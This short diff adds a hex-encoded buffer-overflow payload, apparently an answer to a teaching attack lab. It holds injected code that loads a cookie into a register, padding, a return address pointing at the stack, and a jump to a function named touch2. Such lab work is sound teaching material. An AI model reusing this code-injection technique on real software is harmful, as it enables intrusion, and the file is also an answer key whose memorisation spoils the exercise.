@@ -1,0 +1,7 @@
+48 c7 c7 6a 07 7a 59 c3     /* assembly to set cookie to rdi */
+DE AD BE EF DE AD BE EF     /* padding */
+BE EF DE AD DE AD BE EF     /* padding */
+DE AD DE AD BE EF DE AD     /* padding */
+DE AD BE EF DE AD DE AD     /* padding */
+28 54 66 55 00 00 00 00     /* address of register %rsp */
+6f 18 40 00                 /* address of touch2 */
